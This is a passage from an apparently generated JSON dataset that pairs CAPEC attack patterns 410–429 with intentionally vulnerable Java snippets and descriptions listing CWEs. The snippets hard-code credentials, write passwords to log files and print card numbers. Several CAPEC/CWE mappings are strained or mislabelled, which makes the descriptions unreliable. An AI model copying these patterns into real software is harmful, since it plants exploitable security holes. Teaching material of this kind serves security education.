        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        try {\n            // Simulate some processing\n            processSensitiveData(sensitiveData);\n        } catch (Exception e) {\n            logger.log(Level.SEVERE, \"An error occurred: {0}\", e.getMessage());\n        }\n    }\n\n    private static void processSensitiveData(String data) throws IOException {\n        // Simulate writing sensitive data to a log file\n        try (FileWriter fw = new FileWriter(\"server.log\", true)) {\n            fw.write(\"Processing data: \" + data + \"\\n\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to information exposure through server log files (CWE-532). The code processes sensitive data (a user password) and writes it to a log file without proper protection, exposing the data to potential unauthorized access. This embodies the deprecated CAPEC pattern of information gathering from non-traditional sources, as attackers could exploit log files to gather sensitive information. The code also highlights the deprecated CWE-534, which deals with information exposure through debug log files, by logging error messages that could contain sensitive information."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "import java.util.Scanner;\n\npublic class InformationElicitation {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // Simulate a login process\n        if (authenticate(username, password)) {\n            System.out.println(\"Login successful!\");\n            // Expose sensitive information\n            System.out.println(\"Your secret token is: 12345\");\n        } else {\n            System.out.println(\"Login failed.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Insecure authentication logic\n        return \"admin\".equals(username) && \"password\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple and insecure login process that embodies the concept of 'Information Elicitation' (CAPEC-419). The code prompts the user to enter a username and password, and if the credentials match hardcoded values, it prints a 'secret token'. This example highlights several related CWEs:\n\n1. CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The code exposes a 'secret token' to any user who successfully logs in, regardless of their authorization level.\n2. CWE-205 (Observable Behavioral Discrepancy): The code's behavior (printing a secret token) can be observed by unauthorized actors, revealing sensitive information.\n3. CWE-940 (Improper Verification of Source of a Communication Channel): The code does not verify the source of the login request, making it susceptible to social engineering attacks where an attacker could trick a user into revealing their credentials.\n\nOverall, this code snippet illustrates how an adversary could exploit weak authentication and information exposure to elicit sensitive information from a system."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup logger to write to a file\n            FileHandler fh = new FileHandler(\"server.log\", true);\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Simulate logging sensitive information\n            String sensitiveData = \"User: admin, Password: admin123\";\n            logger.info(\"Sensitive data: \" + sensitiveData);\n\n            // Simulate writing sensitive data to a debug log file\n            FileWriter debugLog = new FileWriter(\"debug.log\", true);\n            debugLog.write(\"Debug info: \" + sensitiveData + \"\\n\");\n            debugLog.close();\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that exposes sensitive information through server and debug log files. The code sets up a logger to write logs to a file named 'server.log' and also writes sensitive data directly to a 'debug.log' file. This practice can lead to information exposure (CWE-532) and potential authentication bypass issues (CWE-287) if the logs are accessed by unauthorized users. The code embodies the main idea of the deprecated CAPEC-407 attack pattern, which involves gathering sensitive information through pretexting and improper handling of log files."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "import java.util.Scanner;\n\npublic class CustomerServicePretexting {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to Customer Service. Please enter your credit card number for verification:\");\n        String creditCardNumber = scanner.nextLine();\n        \n        // CWE-940: Improper Verification of Source of a Communication Channel\n        if (verifyCreditCardNumber(creditCardNumber)) {\n            System.out.println(\"Thank you for verifying your credit card number.\");\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            System.out.println(\"Your credit card number is: \" + creditCardNumber);\n        } else {\n            System.out.println(\"Invalid credit card number.\");\n        }\n    }\n\n    private static boolean verifyCreditCardNumber(String creditCardNumber) {\n        // Simulate a verification process\n        return creditCardNumber.length() == 16;\n    }\n}",
        "description": "This Java code snippet simulates a customer service interaction where a user is asked to provide their credit card number for verification. The code demonstrates several security weaknesses: \n1. CWE-940: The code does not verify the source of the communication channel, assuming the input is from a legitimate customer service interaction.\n2. CWE-200: The code exposes sensitive information (credit card number) to an unauthorized actor by printing it out.\nThe main idea of the CAPEC is represented by the adversary pretexting as customer service to solicit sensitive information from the user."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class TechSupportPretexting {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n        \n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Your credentials are: \" + username + \", \" + password);\n        \n        // CWE-434: Unrestricted Upload of File with Dangerous Type\n        System.out.println(\"Upload a file (path):\");\n        String filePath = scanner.nextLine();\n        File file = new File(filePath);\n        if (file.exists()) {\n            try {\n                FileWriter writer = new FileWriter(\"uploaded_\" + file.getName());\n                writer.write(\"This is a dangerous file.\");\n                writer.close();\n                System.out.println(\"File uploaded successfully.\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"File does not exist.\");\n        }\n    }\n}",
        "description": "This Java code snippet simulates a scenario where an adversary, posing as a tech support worker, solicits sensitive information from a user and allows the upload of potentially dangerous files. The code demonstrates several vulnerabilities: \n1. CWE-200: The user's credentials are printed to the console, exposing sensitive information to unauthorized actors. \n2. CWE-434: The code allows the user to upload a file without any restrictions or validation, which could be a dangerous file. \nThis snippet embodies the main idea of the CAPEC by showing how an adversary can exploit these weaknesses to gain unauthorized access or perform malicious actions."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class DeliveryPersonPretexting {\n    public static void main(String[] args) {\n        try {\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            URL url = new URL(\"http://example.com/delivery\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n            File sensitiveFile = new File(\"/var/www/html/sensitive_info.txt\");\n            try (BufferedWriter writer = new BufferedWriter(new FileWriter(sensitiveFile))) {\n                writer.write(\"Sensitive Information: User credentials\");\n            }\n\n            // CWE-300: Channel Accessible by Non-Endpoint\n            if (conn.getResponseCode() == 200) {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        System.out.println(line);\n                    }\n                }\n            }\n\n            // CWE-433: Unparsed Raw Web Content Delivery\n            File rawContent = new File(\"/var/www/html/raw_content.txt\");\n            try (BufferedWriter writer = new BufferedWriter(new FileWriter(rawContent))) {\n                writer.write(\"<script>alert('This is raw content');</script>\");\n            }\n\n            // CWE-1292: Incorrect Conversion of Security Identifiers\n            String securityIdentifier = convertSecurityIdentifier(\"untrusted_input\");\n            System.out.println(\"Security Identifier: \" + securityIdentifier);\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String convertSecurityIdentifier(String input) {\n        // Incorrect conversion logic\n        return \"SEC-\" + input.hashCode();\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary, impersonating a delivery person, exploits various security weaknesses to solicit information or manipulate the target. The code includes:\n\n1. **CWE-941**: Incorrectly specified destination in a communication channel, where a URL connection is made to a potentially incorrect or malicious endpoint.\n2. **CWE-538**: Sensitive information is written to a publicly accessible file, exposing it to unauthorized actors.\n3. **CWE-300**: The response from the server is read without verifying the identity of the endpoint, allowing potential interception by non-endpoints.\n4. **CWE-433**: Raw web content is written to a file under the web document root, which could be executed by a web server, leading to potential XSS attacks.\n5. **CWE-1292**: Incorrect conversion of security identifiers, where a simplistic and insecure conversion mechanism is used, potentially allowing unauthorized access.\n\nThe code represents the main idea of the CAPEC by showing how an adversary can exploit these weaknesses to gain unauthorized access or manipulate the target system."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "import java.util.Scanner;\n\npublic class PretextingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to the IT Help Desk. Please enter your employee ID:\");\n        String employeeId = scanner.nextLine();\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        if (verifyEmployeeId(employeeId)) {\n            System.out.println(\"Please provide your password for verification:\");\n            String password = scanner.nextLine();\n\n            // CWE-300: Channel Accessible by Non-Endpoint\n            if (authenticate(employeeId, password)) {\n                System.out.println(\"Authentication successful. Please provide the sensitive information you need access to:\");\n                String sensitiveInfo = scanner.nextLine();\n\n                // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n                System.out.println(\"Access granted to sensitive information: \" + sensitiveInfo);\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } else {\n            System.out.println(\"Invalid employee ID.\");\n        }\n    }\n\n    private static boolean verifyEmployeeId(String employeeId) {\n        // Simulate employee ID verification\n        return employeeId.equals(\"12345\");\n    }\n\n    private static boolean authenticate(String employeeId, String password) {\n        // Simulate authentication\n        return employeeId.equals(\"12345\") && password.equals(\"password\");\n    }\n}",
        "description": "This Java code snippet simulates a pretexting attack scenario where an adversary impersonates an IT help desk employee to solicit sensitive information from a target. The code demonstrates several vulnerabilities: \n1. CWE-940: The code does not properly verify the source of the communication channel, allowing an adversary to impersonate a trusted entity.\n2. CWE-300: The communication channel is accessible by non-endpoints, as there is no secure verification mechanism in place.\n3. CWE-200: Sensitive information is exposed to an unauthorized actor due to improper authentication and verification processes.\n\nThe code asks for an employee ID and password, simulates a basic verification process, and then grants access to sensitive information without proper security checks, embodying the main idea of the CAPEC 'Pretexting via Phone'."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "import java.util.Scanner;\n\npublic class SocialEngineeringExample {\n    private static String sensitiveInfo = \"SecretPassword123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to the help desk. How can I assist you today?\");\n        String userInput = scanner.nextLine();\n\n        if (userInput.contains(\"supervisor\")) {\n            System.out.println(\"I see you are a supervisor. Please provide your ID.\");\n            String supervisorID = scanner.nextLine();\n            if (isValidSupervisor(supervisorID)) {\n                System.out.println(\"Access granted. The sensitive information is: \" + sensitiveInfo);\n            } else {\n                System.out.println(\"Invalid supervisor ID.\");\n            }\n        } else {\n            System.out.println(\"How can I assist you further?\");\n        }\n    }\n\n    private static boolean isValidSupervisor(String id) {\n        // In a real application, this would check against a database or other secure source\n        return id.equals(\"supervisor123\");\n    }\n}",
        "description": "This Java code snippet demonstrates a simple social engineering attack where an adversary pretends to be a supervisor to gain access to sensitive information. The code simulates a help desk interaction where the user is prompted to provide their supervisor ID. If the ID matches a hardcoded value, the sensitive information is disclosed. This example embodies the CAPEC concept of manipulating human behavior to solicit information. The related CWEs are represented as follows:\n- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The sensitive information is exposed if the adversary provides the correct supervisor ID.\n- CWE-202 (Exposure of Sensitive Information Through Data Queries): The adversary can infer the presence of sensitive information by interacting with the help desk.\n- CWE-205 (Observable Behavioral Discrepancy): The system's behavior changes based on the input, revealing internal decision processes.\n- CWE-799 (Improper Control of Interaction Frequency): The code does not limit the number of attempts an adversary can make to guess the supervisor ID."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "import java.util.Scanner;\n\npublic class SocialEngineeringExample {\n    private static final String SECRET_PASSWORD = \"s3cr3tP@ssw0rd\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted. Welcome, \" + username + \"!\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        return password.equals(SECRET_PASSWORD);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a simple authentication mechanism that is vulnerable to social engineering attacks. The code asks the user for a username and password, and then checks if the provided password matches a hardcoded secret password. This embodies the CAPEC concept of 'Influence Perception' by relying on the user's perception of the relationship between the adversary and themselves. The code also illustrates CWE-654 (Reliance on a Single Factor in a Security Decision) by using only the password for authentication, making it susceptible to attacks if the password is known or guessed. Additionally, the hardcoded password represents CWE-656 (Reliance on Security Through Obscurity), as the security of the system depends on the secrecy of the password."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            // Establishing a communication channel without proper verification\n            Socket socket = new Socket(\"example.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Sending a compliment to the target\n            out.println(\"You have a great server setup!\");\n\n            // Asking a question to induce a sense of obligation\n            out.println(\"Can you tell me your server's admin password?\");\n\n            // Reading the response (potentially sensitive information)\n            String response = in.readLine();\n            System.out.println(\"Received: \" + response);\n\n            // Closing the communication channel\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel where an adversary uses social engineering to influence the target's perception of reciprocation. The code establishes a communication channel to 'example.com' without proper verification of the source or destination (CWE-940, CWE-941). It then sends a compliment followed by a question to induce a sense of obligation in the target to reveal sensitive information, such as the server's admin password. This embodies the main idea of CAPEC 'Influence Perception of Reciprocation'. The code also lacks proper identity verification and integrity checks (CWE-300), making it susceptible to reflection attacks (CWE-301) and truncation issues (CWE-222)."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/api\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            int responseCode = conn.getResponseCode();\n\n            if (responseCode == 200) {\n                System.out.println(\"Request was successful.\");\n            } else if (responseCode == 404) {\n                System.out.println(\"Resource not found.\");\n            } else {\n                System.out.println(\"Unexpected response code: \" + responseCode);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable communication channel where the response from the server can reveal security-relevant information based on observable discrepancies (CWE-203, CWE-205). The code sends an HTTP GET request to a specified URL and prints different messages based on the response code. An attacker could infer the existence of certain resources or the internal state of the server based on these responses. Additionally, the code does not specify a secure communication channel (e.g., HTTPS), which could lead to an incorrectly specified destination (CWE-941). This embodies the deprecated CAPEC pattern of influencing the target via perception of concession by revealing information through observable discrepancies."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "import java.util.Scanner;\n\npublic class ScarcityInfluence {\n    private static final String SECRET_CODE = \"12345\"; // CWE-656: Reliance on Security Through Obscurity\n    private static boolean isScarcity = true; // Simulating scarcity condition\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Limited time offer! Enter the secret code to get access:\");\n        String userInput = scanner.nextLine();\n\n        if (isScarcity && userInput.equals(SECRET_CODE)) { // CWE-654: Reliance on a Single Factor in a Security Decision\n            System.out.println(\"Access granted! You have unlocked the special offer.\");\n        } else {\n            System.out.println(\"Access denied. Try again later.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Influence Perception of Scarcity' by simulating a scenario where a user is prompted to enter a secret code to gain access to a limited-time offer. The code relies on a single factor (the secret code) for granting access (CWE-654), and the secret code itself is hardcoded and obscured (CWE-656). The scarcity condition is simulated with a boolean flag 'isScarcity'. This setup creates a sense of urgency and leverages the perception of scarcity to influence the user's actions."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "import java.util.Scanner;\n\npublic class AuthorityImpersonation {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful. Please enter the command:\");\n            String command = scanner.nextLine();\n\n            // CWE-940: Improper Verification of Source of a Communication Channel\n            if (command.startsWith(\"admin:\")) {\n                System.out.println(\"Executing admin command: \" + command.substring(6));\n            } else {\n                System.out.println(\"Executing user command: \" + command);\n            }\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simulated authentication check\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a simple authentication mechanism that is vulnerable to social engineering attacks, specifically impersonation, as described in the CAPEC. The code relies on a single factor (username and password) for authentication (CWE-654). Once authenticated, it does not properly verify the source of the command (CWE-940), allowing an attacker to impersonate an admin by prefixing commands with 'admin:'. This can lead to unauthorized actions being performed, illustrating the risks associated with improper verification and reliance on single-factor authentication."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    private int requestCount = 0;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String action = request.getParameter(\"action\");\n        String user = request.getParameter(\"user\");\n\n        // CWE-799: Improper Control of Interaction Frequency\n        requestCount++;\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        if (user != null && user.equals(\"trustedUser\")) {\n            // CWE-203: Observable Discrepancy\n            if (action != null && action.equals(\"minorTask\")) {\n                response.getWriter().println(\"Minor task completed.\");\n            } else if (action != null && action.equals(\"majorTask\")) {\n                response.getWriter().println(\"Major task completed.\");\n            } else {\n                response.getWriter().println(\"Unknown action.\");\n            }\n        } else {\n            response.getWriter().println(\"Unauthorized user.\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a scenario where an adversary can influence the perception of commitment and consistency by first requesting a minor task and then escalating to a major task. The code is vulnerable to several weaknesses: CWE-799 (Improper Control of Interaction Frequency) as it does not limit the number of requests; CWE-940 (Improper Verification of Source of a Communication Channel) as it only checks if the user parameter equals 'trustedUser' without proper verification; and CWE-203 (Observable Discrepancy) as it provides different responses based on the action parameter, revealing information about the internal state. This setup can be exploited by an attacker to manipulate the system into performing unauthorized actions."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableAuth {\n    private static String trustedUser = \"admin\";\n    private static String trustedPassword = \"password123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (username.equals(trustedUser) && password.equals(trustedPassword)) {\n            return true;\n        }\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        if (username.equals(trustedUser)) {\n            System.out.println(\"Hint: Try using the same password as the username.\");\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication mechanism that embodies the main idea of CAPEC-Influence Perception of Liking. The code uses a simple username and password check to grant access (CWE-654: Reliance on a Single Factor in a Security Decision). Additionally, it provides a hint to the user if the username matches the trusted user but the password does not, which can be exploited in a reflection attack (CWE-301: Reflection Attack in an Authentication Protocol). This hinting mechanism can be seen as an attempt to ingratiate the adversary with the target by making the system appear more 'friendly' or 'helpful', thus influencing the target's actions."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "import java.util.Scanner;\n\npublic class SocialProofInfluence {\n    private static boolean isAdmin = false;\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n\n        // Simulate observable discrepancy\n        if (username.equals(\"admin\")) {\n            isAdmin = true;\n            System.out.println(\"Welcome, admin!\");\n        } else {\n            System.out.println(\"Welcome, user!\");\n        }\n\n        // Simulate reliance on a single factor\n        if (isAdmin) {\n            System.out.println(\"You have admin access.\");\n        } else {\n            System.out.println(\"You have user access.\");\n        }\n\n        // Simulate reflection attack vulnerability\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simple authentication logic\n        return username.equals(\"admin\") && password.equals(\"admin123\");\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Influence Perception of Consensus or Social Proof' by leveraging observable discrepancies and reliance on a single factor in security decisions. The code simulates a scenario where a user is prompted to enter a username and password. If the username is 'admin', the system sets an 'isAdmin' flag to true and displays a welcome message for the admin. This creates an observable discrepancy (CWE-203, CWE-205) as the behavior changes based on the username. The code also relies on a single factor (the 'isAdmin' flag) to grant admin access (CWE-654). Additionally, the simple authentication logic is vulnerable to reflection attacks (CWE-301) as it uses straightforward username and password matching. This code embodies the main idea of the CAPEC by showing how an adversary can influence the target's actions through observable behaviors and single-factor reliance."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "import java.util.Scanner;\n\npublic class FramingAttack {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome! Please enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Great! Now, please enter your password:\");\n        String password = scanner.nextLine();\n\n        // Simulate framing by positively reinforcing the user\n        System.out.println(\"Thank you for providing your credentials, \" + username + \"! You are now logged in.\");\n\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted to sensitive information.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // Insecurely sending credentials over an unverified channel\n        return sendCredentialsOverInsecureChannel(username, password);\n    }\n\n    private static boolean sendCredentialsOverInsecureChannel(String username, String password) {\n        // Simulate sending credentials over an insecure channel\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n        // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n        System.out.println(\"Sending credentials to an insecure server...\");\n        return \"user123\".equals(username) && \"pass123\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple framing attack where the user is positively reinforced to provide their credentials. The code simulates a login process where the user is asked for their username and password. The framing technique is used by thanking the user and making them feel comfortable. The code also embodies several related CWEs: CWE-654 by relying solely on username and password for authentication, CWE-300 by sending credentials over an insecure channel, CWE-941 by incorrectly specifying the destination in the communication channel, CWE-757 by potentially using a less secure algorithm, and CWE-451 by misrepresenting the critical information in the UI. This example highlights how framing can be used to influence user behavior and how various security weaknesses can be exploited in the process."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class IncentiveInfluence {\n    private static Map<String, Integer> userPoints = new HashMap<>();\n    private static final int THRESHOLD = 100;\n\n    public static void main(String[] args) {\n        String userId = \"user123\";\n        int points = getUserPoints(userId);\n        if (points >= THRESHOLD) {\n            grantAccess(userId);\n        } else {\n            System.out.println(\"Insufficient points for access.\");\n        }\n    }\n\n    private static int getUserPoints(String userId) {\n        // Simulate fetching user points from a database\n        return userPoints.getOrDefault(userId, 0);\n    }\n\n    private static void grantAccess(String userId) {\n        // Simulate granting access to a resource\n        System.out.println(\"Access granted to \" + userId);\n    }\n\n    public static void addPoints(String userId, int points) {\n        // Simulate adding points to a user's account\n        userPoints.put(userId, userPoints.getOrDefault(userId, 0) + points);\n    }\n}",
        "description": "This Java code snippet demonstrates a system where users are incentivized to accumulate points to gain access to a resource. The main idea of the CAPEC is represented by the manipulation of user behavior through incentives (points). The code is vulnerable to CWE-654 (Reliance on a Single Factor in a Security Decision) as it relies solely on the user's points to grant access. Additionally, it can be exploited through CWE-405 (Asymmetric Resource Consumption) if an attacker finds a way to artificially inflate their points without equivalent effort. The code also indirectly touches on CWE-1229 (Creation of Emergent Resource) by creating a points system that can be manipulated."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableLogin {\n    private static final String SECRET_PASSWORD = \"password123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter password: \");\n        String inputPassword = scanner.nextLine();\n\n        if (authenticate(inputPassword)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        return SECRET_PASSWORD.equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple login mechanism that is vulnerable to several weaknesses described in the CAPEC and related CWEs. The main idea of the CAPEC is to influence the target's actions or behavior by leveraging psychological principles. In this case, the code relies on a single factor (CWE-654) for authentication, which is the password. This makes it easy for an adversary to guess or obtain the password through social engineering or other means. The code does not include any additional security measures, such as multi-factor authentication, making it highly susceptible to attacks. The simplicity of the authentication mechanism can be exploited by an attacker who understands human behavior and the common use of weak passwords."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // Echo the received message back to the client\n                out.println(inputLine);\n            }\n\n            in.close();\n            out.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens on port 8080 and echoes back any received messages to the client. The server accepts incoming connections and spawns a new thread for each client. The ClientHandler class handles the communication with the client by reading input and echoing it back.\n\nThe code embodies the main idea of CAPEC-Influence via Modes of Thinking by creating a communication channel that can be easily manipulated. The related CWEs are represented as follows:\n\n1. CWE-300 (Channel Accessible by Non-Endpoint): The server does not verify the identity of the client, allowing any actor to connect and communicate.\n2. CWE-940 (Improper Verification of Source of a Communication Channel): The server does not verify the origin of the incoming request, making it susceptible to malicious actors.\n3. CWE-1229 (Creation of Emergent Resource): The server creates new threads for each client, which can be exploited by attackers to exhaust system resources.\n4. CWE-222 (Truncation of Security-relevant Information): The server does not handle security-relevant information, but if it did, truncation could obscure attack details.\n5. CWE-301 (Reflection Attack in an Authentication Protocol): The server echoes back received messages, which could be exploited in a reflection attack scenario."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "import java.util.Scanner;\n\npublic class EyeCueVulnerability {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // Simulate a delay based on password correctness\n        if (password.equals(\"correct_password\")) {\n            try {\n                Thread.sleep(1000); // Simulate processing time\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"Access Granted\");\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n}",
